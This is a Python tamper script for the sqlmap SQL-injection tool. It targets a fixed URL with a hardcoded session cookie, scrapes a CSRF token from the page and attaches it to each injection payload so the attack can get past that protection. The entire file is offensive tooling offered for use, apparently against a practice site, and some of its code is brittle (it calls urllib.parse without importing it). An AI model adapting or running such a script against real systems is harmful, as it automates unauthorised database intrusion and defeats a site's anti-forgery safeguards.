#!/usr/bin/env python

import base64
import urllib
import requests
import re
import time
#from bs4 import BeautifulSoup


def getConfig():
    return {
        "base_url": "https://rootkit.es/ard/process.php",
        "phpsessid": "83ftba3nauled5q5dfsfgjq7p1"
    }

def getCSRF(html):
    csrf = html.split("hidden")[1]
    csrf = csrf.split('"')[6]
    return csrf

def tamper(payload, **kwargs):

    # Get headers
    headers = kwargs.get("headers", {})

    # Get config
    config = getConfig()
    base_url = config["base_url"]
    phpsessid = config["phpsessid"]
    
    # Tamper request

    cookies = {
        "PHPSESSID" : phpsessid
    }
    r = requests.get(base_url, cookies=cookies)

    # Get PHPSESSID
    #session_cookie = r.headers["Set-Cookie"]
        # Formatting the session cookie value from Set-Cookie
    #session_cookie = session_cookie.split("=")[1].split(";")[0]
    
    # Set PHPSESSID
    #headers["PHPSESSID"] = session_cookie
    headers["PHPSESSID"] = phpsessid
    # Get CSRF Token

    csrf = getCSRF(r.text)

    # Set CSRF Token

    # Return data to sqlmap

    params = f"{payload}&csrf={csrf}"

    data = urllib.parse.quote_plus(params)
    data = data.replace("%26","&")
    print(data)
    time.sleep(20)

    return data
  